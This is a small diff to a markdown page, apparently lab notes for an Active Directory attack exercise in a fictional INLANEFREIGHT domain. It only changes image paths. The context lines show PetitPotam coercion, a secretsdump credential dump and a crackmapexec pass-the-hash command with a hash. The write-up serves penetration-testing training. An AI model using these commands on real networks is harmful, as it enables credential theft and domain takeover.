@@ -251,7 +251,7 @@ and in another window ->
 python3 PetitPotam.py 172.16.5.225 172.16.5.5
 ```
 
-<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption><p>We catch a cert</p></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>We catch a cert</p></figcaption></figure>
 
 Then we use the following command to request for TGT
 
@@ -272,7 +272,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-
 crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 and now that we know where the flag is located we can launch a command execution attack ->
 
